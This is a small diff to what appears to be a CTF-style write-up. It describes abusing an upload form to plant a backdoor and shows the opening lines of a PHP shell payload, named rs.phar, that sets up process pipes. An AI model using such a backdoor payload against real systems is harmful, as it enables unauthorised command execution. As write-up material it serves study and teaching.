@@ -9,8 +9,9 @@ There's a form you need to abuse to upload a backdoor and pass arbitrary command
 
 There are more work after that, but the payload to upload with the form looks like the following:
 
-```
+```php
 <?php
+// rs.phar
 $descriptor_spec = array(
    0 => array( "pipe", "r" ),
    1 => array( "pipe", "w" ),
